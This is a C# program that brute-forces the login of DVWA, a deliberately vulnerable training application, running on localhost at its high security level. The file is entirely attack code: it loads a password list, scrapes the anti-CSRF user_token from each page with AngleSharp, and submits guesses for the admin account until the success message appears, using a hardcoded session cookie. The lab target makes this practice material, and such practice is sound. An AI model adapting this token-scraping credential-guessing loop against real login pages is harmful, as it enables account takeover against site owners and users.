using AngleSharp;
using AngleSharp.Dom;

namespace DVWA_BruteForce_HighSecurity
{
    internal class Program
    {
        static async Task Main(string[] args)
        {
            // TODO: create command line tack statements, allow for generic user input, allow for specific username attempt, cookie input with example, built in / default password list, help option. write blog post.

            // Initialize password list
            var passwordList = File.ReadLines("C:\\Users\\chris\\Documents\\Programming\\C#\\2023\\DVWA-BruteForce-HighSecurity\\DVWA-BruteForce-HighSecurity\\PasswordList.txt").ToList();
            //var passwordList = File.ReadLines("C:\\Users\\chris\\Documents\\Programming\\C#\\2023\\DVWA-BruteForce-HighSecurity\\DVWA-BruteForce-HighSecurity\\PasswordList.csv").ToList();

            // Initialize HttpClient settings
            var httpClient = new HttpClient();
            var cookieContents = "PHPSESSID=nmal50l9m8re9sgnreen7a74e6; security=high";
            httpClient.BaseAddress = new Uri("http://localhost:3000/vulnerabilities/brute/");
            httpClient.DefaultRequestHeaders.Add("Cookie", cookieContents);

            // Initialize AngleSharp settings
            IConfiguration config = Configuration.Default;
            IBrowsingContext context = BrowsingContext.New(config);

            foreach (var _password in passwordList)
            {
                // Make a GET request to the login page and parse for the CSRF token
                var loginPageResponseBody = await httpClient.GetStringAsync("");
                var document = await context.OpenAsync(req => req.Content(loginPageResponseBody));
                var csrfToken = document.QuerySelector("input[name='user_token']").GetAttribute("value");

                if(csrfToken == null || csrfToken.Length == 0)
                {
                    Console.WriteLine($"CSRF token could not be parsed (attempted password: {_password}");
                    continue;
                }

                var loginAttemptResponseBody = await httpClient.GetStringAsync($"?username=admin&password={_password}&Login=Login&user_token={csrfToken}");

                if (loginAttemptResponseBody.Contains("Username and/or password incorrect"))
                {
                    Console.WriteLine($"Incorrect password ({_password}).");
                }
                else if (loginAttemptResponseBody.Contains("Welcome to the password protected area admin"))
                {
                    Console.WriteLine($"Password is {_password}.");
                    break;
                }
                else
                {
                    Console.WriteLine($"Unexpected response received (attempted password: {_password}.");
                }
            }
        }
    }
}